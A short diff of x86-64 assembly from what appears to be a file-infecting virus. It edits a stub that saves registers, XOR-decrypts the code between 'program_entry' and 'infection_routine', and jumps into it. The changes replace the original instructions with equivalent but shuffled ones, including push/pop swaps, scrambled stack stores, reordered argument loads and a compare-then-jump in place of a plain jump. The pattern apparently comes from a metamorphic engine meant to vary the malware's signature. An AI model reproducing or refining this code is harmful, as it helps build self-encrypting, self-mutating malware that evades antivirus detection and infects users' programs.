@@ -9,27 +9,54 @@ _start:
 
 begin:
 	; save all registers
-	push rax
-	push rdi
-	push rsi
-	push rdx
-	push rcx
-	push rbx
-	push r8
-	push r9
-	push r10
-	push r11
+push r11
+push rax
+pop r11
+pop rax
+
+push r10
+push rdi
+pop r10
+pop rdi
+
+push r9
+push rsi
+pop r9
+pop rsi
+
+push r8
+push rdx
+pop r8
+pop rdx
+
+push rbx
+push rcx
+pop rbx
+pop rcx
+
+sub rsp, 80
+mov [rsp + 32], rcx
+mov [rsp + 48], r8
+mov [rsp + 8], rdi
+mov [rsp + 16], rsi
+mov [rsp + 40], rbx
+mov [rsp + 56], r9
+mov [rsp], rax
+mov [rsp + 24], rdx
+mov [rsp + 72], r11
+mov [rsp + 64], r10
 
 	; uncipher first part of the code
-	lea rdi, [rel program_entry]			; data = &program_entry
-	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
-	lea rdx, [rel key]				; key = key
 	mov rcx, [rel key_size]				; key_size = key_size
+	lea rdx, [rel key]				; key = key
+	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
+	lea rdi, [rel program_entry]			; data = &program_entry
 	cmp rcx, 0					; if (key_size == 0)
 	je program_entry				; 	goto program_entry
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
 
-	jmp program_entry				; goto program_entry
+cmp rax, rax
+je program_entry				; goto program_entry
 
 ; void xor_cipher(char *data, int size, char *key, int key_size);
 ; xor_cipher(rdi data, rsi size, rdx key, rcx key_size);
